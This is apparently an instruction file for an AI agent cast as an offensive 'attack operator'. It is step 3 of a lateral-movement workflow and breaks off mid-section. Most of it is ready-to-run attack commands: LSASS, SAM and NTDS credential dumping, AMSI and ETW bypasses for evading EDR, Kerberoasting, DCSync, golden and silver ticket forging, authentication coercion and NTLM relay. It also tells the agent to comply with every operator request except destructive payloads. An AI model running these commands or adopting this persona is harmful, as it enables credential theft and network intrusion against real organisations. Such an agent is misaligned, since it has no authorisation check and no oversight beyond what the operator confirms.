# Step 3: Credential Operations & Relay Setup

**Progress: Step 3 of 10** — Next: Windows Lateral Movement

## STEP GOAL:

Execute credential harvesting and manipulation operations to prepare for lateral movement. Extract credentials from compromised systems, prepare pass-the-hash/pass-the-ticket/overpass-the-hash attacks, set up NTLM relay infrastructure, and build a credential map linking identities to target systems. Credentials are ammunition — this step loads the magazine, subsequent steps pull the trigger.

## MANDATORY EXECUTION RULES (READ FIRST):

### Universal Rules:

- 🛑 NEVER execute lateral movement in this step — credential preparation ONLY, movement is steps 04-07
- 📖 CRITICAL: Read the complete step file before taking any action
- 🔄 CRITICAL: When loading next step with 'C', ensure entire file is read
- 📋 YOU ARE A LATERAL MOVEMENT SPECIALIST preparing credential operations, not an autonomous exploit tool
- ✅ YOU MUST ALWAYS SPEAK OUTPUT in your Agent communication style with the config `{communication_language}`
- ✅ YOU MUST ALWAYS WRITE all artifact and document content in `{document_output_language}`

### Role Reinforcement:

- ✅ You are Phantom — Attack Operator + Post-Exploitation Specialist
- ✅ You bring 8 years of complex multi-phase operations expertise
- ✅ You think in attack trees and decision branches
- ✅ You operate with precision — every action has a purpose
- ✅ You collaborate with the operator as a peer expert

### Step-Specific Rules:

- 🎯 Credential operations ONLY — do not execute lateral movement yet (that is steps 04-07)
- 🔒 Every credential harvested must be catalogued with scope, type, and verified/unverified status
- ⚠️ Credential operations against LSASS/SAM/NTDS WILL generate alerts — assess EDR evasion before extraction
- 🗺️ Build the credential→target map — credentials are ammunition, not the attack itself
- 📋 Distinguish between credential types: cleartext, NTLM hash, Kerberos ticket, certificate, token, SSH key

### Agent Autonomy Protocol:
- 🧠 YOU ARE THE PROFESSIONAL — your expertise informs the operator, the operator decides
- 🚫 HARD BLOCK — Destructive payloads ONLY (ransomware, wipers, data destroyers, tools designed to cause permanent damage). This is the ONLY action the agent refuses.
- ⚠️ WARN with explanation if you identify risk in the operator's approach:
  - LSASS access triggers EDR detections in most modern environments — assess evasion requirements (AMSI bypass, ETW patching, direct syscalls, MiniDumpWriteDump alternatives) before attempting
  - Mass credential spraying against discovered targets risks account lockouts that alert the SOC and lock the operator out — validate lockout policy first, spray low and slow
  - NTLM relay requires network positioning (responder/mitm6) that generates distinctive network artifacts — assess NTA monitoring before deployment
  Always COMPLY after warning if the operator confirms.
- 💡 PROPOSE ALTERNATIVES when you see risk — give options, not roadblocks

## EXECUTION PROTOCOLS:

- 🎯 Present your credential operations plan before beginning extraction
- ⚠️ Present [A]/[W]/[C] menu after credential ops complete
- 💾 ONLY save findings to output document when user chooses C (Continue)
- 📖 Update frontmatter, adding this step to the end of the list of stepsCompleted
- 🚫 FORBIDDEN to load next step until C is selected

## CONTEXT BOUNDARIES:

- Available context: Step-01 access ingestion data, step-02 internal recon results (target list, services, trust relationships, SMB signing status)
- Focus: Credential operations and relay preparation only
- Limits: Do NOT execute lateral movement — credential harvesting, manipulation, and relay setup only
- Dependencies: step-02-internal-recon.md (target enumeration, service discovery, SMB signing data)

## Sequence of Instructions (Do not deviate, skip, or optimize)

### 1. Credential Inventory

Review all credentials obtained during prior phases (initial access, privilege escalation, step-01 access ingestion). Build the baseline credential inventory before new extraction.

**Categorize existing credentials:**

| Category | Description | Usability for Lateral Movement |
|----------|-------------|-------------------------------|
| Cleartext Passwords | Plaintext domain/local passwords | Direct auth — highest value |
| NTLM Hashes | NT hash (e.g., aad3b435...:::) | Pass-the-Hash — high value |
| Kerberos TGT | Ticket Granting Tickets | Pass-the-Ticket — high value, time-limited |
| Kerberos TGS | Service Tickets | Service-specific access, crackable |
| Certificates | X.509 certs with private keys | PKINIT auth — high value, long-lived |
| API Keys/Tokens | Cloud/SaaS authentication tokens | Cloud lateral movement |
| SSH Private Keys | RSA/ED25519 private keys | Linux lateral movement |
| DPAPI Blobs | Protected credential material | Requires master key — medium value |

**Present baseline credential inventory:**
```
| Cred ID | Source Phase | Account | Domain | Type | Format | Scope | Verified | Expiry |
|---------|------------|---------|--------|------|--------|-------|----------|--------|
| CRED-001 | {{phase}} | {{account}} | {{domain}} | {{type}} | Cleartext/Hash/Ticket/Key | Local/Domain/Cloud | Yes/No | {{expiry}} |
| CRED-002 | {{phase}} | {{account}} | {{domain}} | {{type}} | {{format}} | {{scope}} | Yes/No | {{expiry}} |
```

### 2. Local Credential Extraction

For each compromised system, extract credentials using techniques appropriate to the OS and available tools. Present EDR evasion requirements BEFORE execution.

#### 2a. Windows Credential Extraction

**SAM Database Extraction (T1003.002 — Security Account Manager):**
```
# Registry-based SAM dump (requires local admin)
reg save HKLM\SAM C:\Windows\Temp\sam.bak
reg save HKLM\SYSTEM C:\Windows\Temp\sys.bak
reg save HKLM\SECURITY C:\Windows\Temp\sec.bak

# Remote extraction via secretsdump
impacket-secretsdump {{domain}}/{{user}}:{{pass}}@{{target}} -sam -system -security

# In-memory SAM dump (no file drop)
mimikatz "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```
OPSEC: Registry access logged (Sysmon Event 13/14). File drops detected by AV/EDR. Secretsdump remote connection logged as SMB auth event.

**LSASS Memory Extraction (T1003.001 — LSASS Memory):**

⚠️ **CRITICAL: LSASS access is the #1 detected credential extraction technique. Assess EDR first.**

| Technique | Tool | EDR Evasion Level | Detection Indicators |
|-----------|------|-------------------|---------------------|
| comsvcs.dll MiniDump | `rundll32 C:\Windows\System32\comsvcs.dll, MiniDump {{lsass_pid}} C:\temp\lsass.dmp full` | Low — widely signatured | Process access to LSASS (Sysmon 10), file creation |
| nanodump | `nanodump.exe --write C:\temp\nano.dmp` | Medium-High — direct syscalls, unhooking | Minimal — avoids NtReadVirtualMemory hook |
| PPLdump | `PPLdump.exe {{lsass_pid}} lsass.dmp` | Medium — bypasses RunAsPPL | Exploits CSRSS for PP elevation |
| HandleKatz | `HandleKatz.exe` | Medium-High — handle duplication | Duplicate handle to LSASS, no direct open |
| MirrorDump | `MirrorDump.exe` | High — SSP-based, no LSASS open | Loads SSP DLL into LSASS — DLL load event |
| Pypykatz (live) | `pypykatz live lsa` | Low — Python-based, easily detected | Direct process access |
| Mimikatz sekurlsa | `mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"` | Low — heavily signatured | Process creation, LSASS access, command line |
| Silent Process Exit | Abuse SilentProcessExit registry for LSASS dump | Medium-High | Registry modification, WerFault invocation |
| LSASS Shtinkering | `lsass_shtinkering.exe` | High — abuses Windows Error Reporting | WER process invocation, temp dump file |

**EDR evasion pre-checks:**
```
# Check for LSASS protection (RunAsPPL)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL

# Check Credential Guard status
reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags

# Check for EDR hooks on LSASS
# Identify EDR product to determine hooking behavior
Get-Process | Where-Object {$_.ProcessName -match "MsMp|Carbon|Crowd|Sentinel|Cylance|Sophos|Cortex|Elastic"}

# AMSI bypass (if PowerShell-based extraction)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ETW patching (disable Script Block Logging telemetry)
$etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static')
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etw.GetValue($null),0)
```

**DPAPI Credential Extraction (T1555.004 — Windows Credential Manager):**
```
# Credential Manager enumeration
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all

# DPAPI master key extraction
mimikatz "dpapi::masterkey /in:{{masterkey_path}} /rpc" "exit"

# Chrome/Edge saved passwords (DPAPI-protected)
mimikatz "dpapi::chrome /in:\"{{user_profile}}\AppData\Local\Google\Chrome\User Data\Default\Login Data\"" "exit"

# Credential Manager blobs
mimikatz "dpapi::cred /in:{{cred_path}}" "exit"

# SharpDPAPI comprehensive extraction
SharpDPAPI.exe triage
SharpDPAPI.exe machinetriage
```
OPSEC: DPAPI operations are low-noise — standard Windows API usage. Chrome database access may trigger AV if known tool signatures are present.

**Cached Domain Credentials (T1003.005 — Cached Domain Credentials):**
```
# DCC2 hashes from registry (cached logons)
impacket-secretsdump -sam sam.bak -system sys.bak -security sec.bak LOCAL

# Mimikatz cached credentials
mimikatz "lsadump::cache" "exit"

# Number of cached logons
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount
```
OPSEC: Registry access required. DCC2 hashes are slow to crack (PBKDF2 iterations).

**Vault & WiFi Credentials:**
```
# Windows Vault
vaultcmd /listcreds:"Web Credentials" /all

# WiFi passwords (cleartext)
netsh wlan show profiles
netsh wlan show profile name="{{ssid}}" key=clear

# Certificate private keys
certutil -store My
certutil -exportPFX My {{thumbprint}} cert.pfx {{password}}
```

#### 2b. Linux Credential Extraction

**Shadow File & Local Credentials (T1003.008):**
```
# Shadow file (if root)
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "*.pem" -path "*ssh*" 2>/dev/null

# Check for passphrase-protected keys
for key in $(find /home -name "id_rsa" 2>/dev/null); do
  ssh-keygen -y -f "$key" -P "" 2>&1 | grep -q "incorrect" && echo "ENCRYPTED: $key" || echo "CLEARTEXT: $key"
done
```

**Bash History & Configuration Files (T1552.003):**
```
# History files with credential patterns
for hist in /home/*/.bash_history /root/.bash_history /home/*/.zsh_history; do
  grep -iE "password|passwd|pass=|pwd=|secret|token|mysql.*-p|ssh.*-i|sshpass|curl.*-u|wget.*--password" "$hist" 2>/dev/null
done

# Credential files
cat /home/*/.netrc 2>/dev/null
cat /home/*/.git-credentials 2>/dev/null
cat /home/*/.pgpass 2>/dev/null
cat /home/*/.my.cnf 2>/dev/null | grep password
```

**Kerberos Keytabs (T1558.004):**
```
# Find keytab files
find / -name "*.keytab" 2>/dev/null
klist -k /etc/krb5.keytab 2>/dev/null

# Extract keytab entries
klist -kte {{keytab_path}}

# Use keytab for authentication
kinit -kt {{keytab_path}} {{principal}}
```

**Keyring Extraction:**
```
# GNOME Keyring
find /home -path "*keyrings*" -name "*.keyring" 2>/dev/null
python3 -c "import secretstorage; bus = secretstorage.dbus_init(); col = secretstorage.get_all_collections(bus); [print(i.get_label(), [dict(s.get_attributes()) for s in i.get_all_items()]) for i in col]"

# KDE Wallet
find /home -name "*.kwl" 2>/dev/null
```

**In-Memory Credential Extraction:**
```
# Process memory dump for credentials
gcore -o /tmp/procdump {{pid}}
strings /tmp/procdump.{{pid}} | grep -iE "password|passwd|secret|token"

# Mimipenguin (Linux LSASS equivalent)
python3 mimipenguin.py

# LaZagne comprehensive extraction
python3 laZagne.py all
```
OPSEC: Process memory access via ptrace generates auditd events. Tool execution may trigger file integrity monitoring.

**For each credential extracted, immediately log:**
```
| Cred ID | System | Account | Domain | Type | Format | Extraction Method | EDR Risk | Verified |
|---------|--------|---------|--------|------|--------|-------------------|----------|----------|
| CRED-{{n}} | {{host}} | {{account}} | {{domain}} | {{type}} | {{format}} | {{method}} | Low/Med/High | Yes/No |
```

### 3. Domain Credential Operations (If AD Environment)

**⚠️ OPERATOR CHECKPOINT: Domain credential operations generate domain-level telemetry. Present plan before execution.**

#### 3a. Kerberoasting (T1558.003)

```
# Impacket GetUserSPNs
impacket-GetUserSPNs {{domain}}/{{user}}:{{pass}} -dc-ip {{dc_ip}} -request -outputfile kerberoast.txt

# Rubeus (from Windows)
Rubeus.exe kerberoast /outfile:kerberoast.txt
Rubeus.exe kerberoast /stats  # Preview without requesting tickets

# Targeted Kerberoasting (specific high-value SPNs)
Rubeus.exe kerberoast /user:{{target_spn_user}} /outfile:targeted_tgs.txt

# CrackMapExec
nxc ldap {{dc_ip}} -u {{user}} -p {{pass}} --kerberoasting kerberoast.txt
```
OPSEC: Kerberoasting generates TGS requests (Event 4769) with RC4 encryption type — anomalous if AES is standard. Targeted Kerberoasting (single SPN) is less detectable than mass requests.

#### 3b. AS-REP Roasting (T1558.004)

```
# Find accounts without pre-authentication
impacket-GetNPUsers {{domain}}/ -dc-ip {{dc_ip}} -usersfile users.txt -format hashcat -outputfile asrep.txt

# Rubeus (from Windows)
Rubeus.exe asreproast /outfile:asrep.txt

# LDAP query for accounts with DONT_REQ_PREAUTH
nxc ldap {{dc_ip}} -u {{user}} -p {{pass}} --asreproast asrep.txt
ldapsearch -x -H ldap://{{dc_ip}} -b "DC={{domain}},DC={{tld}}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```
OPSEC: AS-REP requests (Event 4768) with no pre-auth — lower detection risk than Kerberoasting since these are expected for configured accounts.

#### 3c. DCSync (T1003.006 — If DA/Replication Rights Achieved)

**⚠️ DCSync is extremely detectable. Only execute with Domain Admin or accounts with replication rights.**

```
# Targeted DCSync — specific accounts only, NOT full database
impacket-secretsdump {{domain}}/{{da_user}}:{{da_pass}}@{{dc_ip}} -just-dc-user {{target_account}}
impacket-secretsdump {{domain}}/{{da_user}}:{{da_pass}}@{{dc_ip}} -just-dc-user krbtgt  # For Golden Ticket

# Mimikatz DCSync
mimikatz "lsadump::dcsync /domain:{{domain}} /user:{{target_account}}" "exit"
mimikatz "lsadump::dcsync /domain:{{domain}} /user:krbtgt" "exit"

# CRITICAL: Do NOT dump all accounts unless operator explicitly approves
# Full DCSync: impacket-secretsdump {{domain}}/{{da_user}}:{{da_pass}}@{{dc_ip}} -just-dc
```
OPSEC: DCSync generates Directory Replication Service (DRS) events (Event 4662 with GUID 1131f6aa-...). MDI/ATA will immediately alert on non-DC replication. Use only for targeted extraction.

#### 3d. NTDS.dit Extraction Alternatives (T1003.003)

```
# Volume Shadow Copy (requires DA on DC)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{{n}}\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{{n}}\Windows\System32\config\SYSTEM C:\temp\sys.bak

# ntdsutil
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds_dump" quit quit

# DIT Snapshot (PowerShell)
$snap = (gwmi -List Win32_ShadowCopy).Create("C:\","ClientAccessible")

# Offline extraction (after obtaining ntds.dit + SYSTEM)
impacket-secretsdump -ntds ntds.dit -system sys.bak LOCAL
```
OPSEC: VSS creation logged (Event 8222). ntdsutil usage logged. Large file copy from DC is anomalous.

#### 3e. GPP Passwords (T1552.006 — Group Policy Preferences)

```
# SYSVOL search for cpassword
findstr /SIM /C:"cpassword" \\{{domain}}\SYSVOL\{{domain}}\Policies\*.xml

# CrackMapExec
nxc smb {{dc_ip}} -u {{user}} -p {{pass}} -M gpp_password

# PowerShell
Get-GPPPassword  # PowerSploit module

# Manual search
Get-ChildItem "\\{{domain}}\SYSVOL\{{domain}}\Policies" -Recurse -Include Groups.xml,Services.xml,Scheduledtasks.xml,DataSources.xml,Drives.xml,Printers.xml
```
OPSEC: SYSVOL access is normal domain behavior — very low detection risk.

#### 3f. LAPS Password Retrieval (T1552)

```
# Check if LAPS is deployed
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null}

# LAPS password retrieval (requires read access to ms-Mcs-AdmPwd attribute)
Get-ADComputer {{target_computer}} -Properties ms-Mcs-AdmPwd | Select-Object Name,ms-Mcs-AdmPwd

# CrackMapExec LAPS
nxc ldap {{dc_ip}} -u {{user}} -p {{pass}} -M laps

# LAPSToolkit
Get-LAPSComputers
Find-LAPSDelegatedGroups

# Windows LAPS (new — ms-LAPS-Password attribute, encrypted)
Get-LapsADPassword -Identity {{target_computer}} -AsPlainText
```
OPSEC: LAPS password reads are logged (Event 4662 on the computer object). If LAPS auditing is enabled, reads are highly visible.

#### 3g. gMSA Password Extraction (T1555)

```
# Find gMSA accounts
Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword,msDS-ManagedPasswordId

# Extract gMSA password (requires membership in PrincipalsAllowedToRetrieve)
$gmsa = Get-ADServiceAccount -Identity {{gmsa_name}} -Properties msDS-ManagedPassword
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$secpwd = $mp.SecureCurrentPassword

# gMSADumper (Python)
python3 gMSADumper.py -u {{user}} -p {{pass}} -d {{domain}}

# Impacket
impacket-ntlmrelayx --dump-gmsa
```
OPSEC: gMSA password retrieval is logged but only suspicious if the requesting account is not in the allowed principals list.

**Present domain credential extraction results:**
```
| Cred ID | Method | Account | Type | Format | Crackable | Direct Use | Lateral Value |
|---------|--------|---------|------|--------|-----------|-----------|---------------|
| CRED-{{n}} | {{method}} | {{account}} | Domain | NTLM Hash/TGS/Cleartext | Yes/No | PtH/PtT/Direct | High/Med/Low |
```

### 4. Credential Manipulation & Preparation

Prepare harvested credentials for use in lateral movement techniques (steps 04-07).

#### 4a. Pass-the-Hash Preparation (T1550.002)

```
# CrackMapExec/NetExec — verify hash validity
nxc smb {{target}} -u {{user}} -H {{ntlm_hash}} -d {{domain}}

# Impacket psexec with hash
impacket-psexec {{domain}}/{{user}}@{{target}} -hashes :{{ntlm_hash}}

# Impacket wmiexec with hash
impacket-wmiexec {{domain}}/{{user}}@{{target}} -hashes :{{ntlm_hash}}

# Mimikatz PTH
mimikatz "sekurlsa::pth /user:{{user}} /domain:{{domain}} /ntlm:{{ntlm_hash}} /run:cmd.exe" "exit"

# Evil-WinRM with hash
evil-winrm -i {{target}} -u {{user}} -H {{ntlm_hash}}
```

#### 4b. Pass-the-Ticket Preparation (T1550.003)

```
# Export current tickets
mimikatz "kerberos::list /export" "exit"
Rubeus.exe dump /nowrap

# Import ticket into current session
mimikatz "kerberos::ptt {{ticket_file}}" "exit"
Rubeus.exe ptt /ticket:{{base64_ticket}}

# Verify ticket loaded
klist

# Ticket lifetime management — check expiry
Rubeus.exe describe /ticket:{{base64_ticket}}

# Request new TGS using imported TGT
Rubeus.exe asktgs /ticket:{{tgt_base64}} /service:cifs/{{target}}.{{domain}} /nowrap
```
OPSEC: Ticket imports are purely in-memory — no persistent artifacts. However, service ticket requests generate Event 4769. Anomalous ticket properties (forged PAC, wrong encryption type) may trigger MDI.

#### 4c. Overpass-the-Hash / Pass-the-Key (T1550.002)

```
# Convert NTLM hash to Kerberos TGT (Overpass-the-Hash)
Rubeus.exe asktgt /user:{{user}} /domain:{{domain}} /rc4:{{ntlm_hash}} /nowrap
Rubeus.exe asktgt /user:{{user}} /domain:{{domain}} /aes256:{{aes256_key}} /nowrap  # Preferred — AES is less anomalous

# Impacket getTGT
impacket-getTGT {{domain}}/{{user}} -hashes :{{ntlm_hash}} -dc-ip {{dc_ip}}
export KRB5CCNAME={{user}}.ccache

# Mimikatz Overpass-the-Hash
mimikatz "sekurlsa::pth /user:{{user}} /domain:{{domain}} /ntlm:{{ntlm_hash}} /run:powershell.exe" "exit"
# Resulting PowerShell session will use Kerberos
```
OPSEC: OPtH with RC4 generates TGT request with RC4 encryption (Event 4768 with encryption type 0x17) — anomalous in AES-only environments. AES256 is preferred when available.

#### 4d. Golden Ticket Preparation (T1558.001)

**Only if krbtgt hash is available from DCSync/NTDS extraction:**
```
# Golden Ticket forge
mimikatz "kerberos::golden /user:{{target_user}} /domain:{{domain}} /sid:{{domain_sid}} /krbtgt:{{krbtgt_hash}} /id:500 /ptt" "exit"

# Impacket ticketer
impacket-ticketer -nthash {{krbtgt_hash}} -domain-sid {{domain_sid}} -domain {{domain}} {{target_user}}
export KRB5CCNAME={{target_user}}.ccache

# Rubeus Golden Ticket
Rubeus.exe golden /rc4:{{krbtgt_hash}} /user:{{target_user}} /domain:{{domain}} /sid:{{domain_sid}} /ptt

# Key parameters:
# - /id:500 = Administrator RID
# - /groups:512,513,518,519,520 = Domain Admins + Schema Admins + Enterprise Admins
# - /startoffset:-10 = Backdate ticket start by 10 minutes
# - /endin:600 = 10-hour ticket lifetime
# - /renewmax:10080 = 7-day max renewal
```
OPSEC: Golden Tickets with default parameters have known anomalies — MDI detects tickets with lifetimes exceeding policy. Use realistic parameters matching the domain's Kerberos policy. Event 4769 with fabricated PAC may trigger advanced detections.

#### 4e. Silver Ticket Preparation (T1558.002)

```
# Silver Ticket for specific service
mimikatz "kerberos::golden /user:{{user}} /domain:{{domain}} /sid:{{domain_sid}} /target:{{target_server}}.{{domain}} /service:cifs /rc4:{{machine_hash}} /ptt" "exit"

# Common service SPNs for Silver Tickets:
# cifs/{{host}} — File share access (SMB)
# http/{{host}} — Web service access
# host/{{host}} — Scheduled tasks, WMI
# mssql/{{host}} — SQL Server access
# ldap/{{host}} — LDAP operations (on DC = DCSync capability)

# Impacket Silver Ticket
impacket-ticketer -nthash {{machine_hash}} -domain-sid {{domain_sid}} -domain {{domain}} -spn cifs/{{target}}.{{domain}} {{user}}
```
OPSEC: Silver Tickets never touch the DC (no TGT request) — they are validated only by the target service. Detection requires monitoring for service tickets without corresponding TGT requests, which most environments do not log.

#### 4f. Certificate-Based Authentication Preparation (T1649)

```
# If certificates with private keys were extracted:
# PKINIT authentication using certificate
Rubeus.exe asktgt /user:{{user}} /certificate:{{pfx_path}} /password:{{pfx_password}} /nowrap

# Certipy (Python)
certipy auth -pfx {{cert.pfx}} -dc-ip {{dc_ip}}

# PassTheCert
python3 passthecert.py -action ldap-shell -crt {{cert.pem}} -key {{key.pem}} -domain {{domain}} -dc-ip {{dc_ip}}
```
OPSEC: Certificate-based auth generates PKINIT events (Event 4768 with pre-auth type 16). Certificate authentication is less commonly monitored than password/hash-based auth.

**Present prepared attack matrix:**
```
| Cred ID | Account | Technique | Tool | Target(s) | Readiness | Detection Risk |
|---------|---------|-----------|------|-----------|-----------|----------------|
| CRED-{{n}} | {{account}} | Pass-the-Hash | nxc/impacket | {{targets}} | Ready | Medium |
| CRED-{{n}} | {{account}} | Pass-the-Ticket | Rubeus | {{targets}} | Ready | Low-Medium |
| CRED-{{n}} | {{account}} | Overpass-the-Hash (AES) | Rubeus | {{targets}} | Ready | Low |
| CRED-{{n}} | {{account}} | Golden Ticket | mimikatz | All domain | Ready | Medium-High |
| CRED-{{n}} | {{account}} | Silver Ticket | mimikatz | {{service}} | Ready | Low |
| CRED-{{n}} | {{account}} | Certificate Auth | Certipy | {{targets}} | Ready | Low |
| CRED-{{n}} | {{account}} | SSH Key | ssh | {{linux_targets}} | Ready | Low |
```

### 5. NTLM Relay Setup (If Applicable)

**⚠️ OPERATOR CHECKPOINT: Relay infrastructure requires network manipulation. Present feasibility assessment before deployment.**

#### 5a. Relay Target Identification

```
# Systems without SMB signing enforcement (from step-02)
# Review relay_targets.txt from nxc --gen-relay-list
cat relay_targets.txt

# Verify SMB signing status
nxc smb {{targets}} --gen-relay-list verified_relay_targets.txt

# LDAP signing check (for LDAP relay)
nxc ldap {{dc_ip}} -u {{user}} -p {{pass}} -M ldap-checker

# LDAPS channel binding check
python3 LdapRelayScan.py -dc-ip {{dc_ip}} -u {{user}} -p {{pass}}
```

**Relay target matrix:**
```
| Target | SMB Signing | LDAP Signing | LDAPS Channel Binding | Relay Viable | Relay Target Protocol |
|--------|------------|-------------|----------------------|-------------|---------------------|
| {{host}} | Disabled | Not Required | Not Required | Yes | SMB/LDAP/HTTP |
| {{host}} | Enabled | — | — | No (SMB) | — |
```

#### 5b. Coercion Techniques (T1187 — Forced Authentication)

```
# PetitPotam — EFSRPC coercion (unauthenticated on unpatched DCs)
python3 PetitPotam.py {{listener_ip}} {{target_ip}}
python3 PetitPotam.py -u {{user}} -p {{pass}} -d {{domain}} {{listener_ip}} {{target_ip}}

# PrinterBug / SpoolSample — Print Spooler coercion
python3 printerbug.py {{domain}}/{{user}}:{{pass}}@{{target}} {{listener_ip}}
SpoolSample.exe {{target}} {{listener_ip}}

# DFSCoerce — DFS coercion
python3 dfscoerce.py -u {{user}} -p {{pass}} -d {{domain}} {{listener_ip}} {{target_ip}}

# ShadowCoerce — FSrvp coercion
python3 shadowcoerce.py -u {{user}} -p {{pass}} -d {{domain}} {{listener_ip}} {{target_ip}}

# Coerce via WebDAV (SearchConnector abuse)
# Create .searchConnector-ms file pointing to listener on target share
```

OPSEC per coercion technique:
| Technique | Network Artifact | Event Log | Detection Risk |
|-----------|-----------------|-----------|----------------|
| PetitPotam | EFSRPC call to listener | 5145 (share access) | Medium — widely known |
| PrinterBug | RPC call to Print Spooler | Spooler service events | Medium |
| DFSCoerce | DFS referral request | DFS service events | Low-Medium |
| ShadowCoerce | FSrvp VSS call | VSS events | Low — less known |
| WebDAV | HTTP request to listener | WebClient service | Low |

#### 5c. Relay Infrastructure Configuration

```
# ntlmrelayx — SMB relay for command execution
impacket-ntlmrelayx -t smb://{{target}} -smb2support -c "whoami > C:\temp\relayed.txt"

# ntlmrelayx — LDAP relay for RBCD delegation
impacket-ntlmrelayx -t ldaps://{{dc_ip}} --delegate-access --escalate-user {{controlled_machine}}$

# ntlmrelayx — LDAP relay for shadow credentials
impacket-ntlmrelayx -t ldaps://{{dc_ip}} --shadow-credentials --shadow-target {{target_computer}}$

# ntlmrelayx — HTTP relay to ADCS (ESC8)
impacket-ntlmrelayx -t http://{{adcs_server}}/certsrv/certfnsh.asp --adcs --template DomainController

# ntlmrelayx — Multi-relay with SOCKS
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks

# Responder for initial capture (LLMNR/NBNS poisoning)
responder -I {{interface}} -wrfv
# NOTE: Poisoning is active — generates NTA artifacts

# mitm6 for DNS takeover + relay
mitm6 -d {{domain}} -i {{interface}}
# Combine with: impacket-ntlmrelayx -t ldaps://{{dc_ip}} -wh {{wpad_host}} --delegate-access
```

**Present relay attack plan:**
```
| Relay Chain | Coercion | Capture | Relay To | Target Action | Probability | Detection Risk |
|-------------|----------|---------|----------|---------------|-------------|----------------|
| {{chain_id}} | PetitPotam → DC | ntlmrelayx | LDAPS → DC | RBCD delegation | High | Medium-High |
| {{chain_id}} | PrinterBug → Server | ntlmrelayx | SMB → Target | Command exec | Medium | Medium |
| {{chain_id}} | mitm6 → Workstation | ntlmrelayx | ADCS HTTP | Certificate issuance | High | Medium |
```

### 6. Credential→Target Mapping

Build the comprehensive correlation matrix linking credentials to targets for lateral movement execution.

**Master Credential→Target Map:**
```
| Cred ID | Account | Target | Service | Auth Protocol | Technique | Confidence | Step |
|---------|---------|--------|---------|---------------|-----------|------------|------|
| CRED-{{n}} | {{account}} | {{target_host}} | SMB (445) | NTLM (PtH) | psexec/smbexec | Verified/Likely/Speculative | Step 04 |
| CRED-{{n}} | {{account}} | {{target_host}} | WinRM (5985) | Kerberos (PtT) | evil-winrm | Verified/Likely/Speculative | Step 04 |
| CRED-{{n}} | {{account}} | {{target_host}} | SSH (22) | SSH Key | ssh -i | Verified/Likely/Speculative | Step 05 |
| CRED-{{n}} | {{account}} | {{target_host}} | LDAP (389) | Kerberos (OPtH) | DCSync/RBCD | Verified/Likely/Speculative | Step 06 |
| CRED-{{n}} | {{account}} | {{cloud_target}} | API | Token | aws sts/az cli | Verified/Likely/Speculative | Step 07 |
```

**Confidence levels:**
- **Verified:** Credential tested and confirmed valid against target (e.g., nxc smb returned Pwn3d!)
- **Likely:** Credential type and scope suggest validity (e.g., domain admin hash against domain member)
- **Speculative:** Credential may work based on password reuse patterns or trust relationships

**Coverage analysis:**
```
| Target (from Step-02) | Priority Rank | Credentials Available | Techniques Available | Coverage Status |
|----------------------|---------------|----------------------|---------------------|----------------|
| {{target_1}} | 1 | {{count}} creds | PtH, WinRM, RDP | Covered |
| {{target_2}} | 2 | {{count}} creds | SSH key | Covered |
| {{target_3}} | 3 | 0 creds | — | Gap — requires relay or cracking |
| {{target_4}} | 4 | {{count}} creds (speculative) | PtH | Partial |
```

### 7. Offline Cracking Assessment

For hashes that are not directly usable (require cracking for cleartext), assess cracking feasibility.

**Hash cracking plan:**
```
| Hash Type | Count | Hashcat Mode | Example Wordlist/Rules | Estimated Time (RTX 4090) | Priority |
|-----------|-------|-------------|----------------------|--------------------------|----------|
| NTLM | {{count}} | -m 1000 | rockyou + dive rules | Minutes-hours | High |
| NetNTLMv2 | {{count}} | -m 5600 | rockyou + OneRuleToRuleThemAll | Hours-days | Medium |
| DCC2 | {{count}} | -m 2100 | Targeted (company words) | Days-weeks | Low |
| Kerberos TGS (RC4) | {{count}} | -m 13100 | rockyou + corporate wordlist | Hours-days | High |
| Kerberos TGS (AES) | {{count}} | -m 19700 | Targeted | Days-weeks | Medium |
| AS-REP | {{count}} | -m 18200 | rockyou + rules | Hours | High |

# Hashcat commands:
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule
hashcat -m 5600 netntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Cracked credentials → add to credential inventory and update Credential→Target Map.**

### 8. Document Findings

**Write consolidated credential operations findings to the output document under `## Credential Operations & Relay Setup`:**

```markdown
## Credential Operations & Relay Setup

### Credential Inventory
{{master_credential_table — all CRED-xxx entries with source, type, format, scope}}

### Local Extraction Results
{{local_extraction — per-system extraction results with EDR evasion notes}}

### Domain Credential Operations
{{domain_ops — Kerberoasting, AS-REP, DCSync, GPP, LAPS, gMSA results}}

### Credential Manipulation Matrix
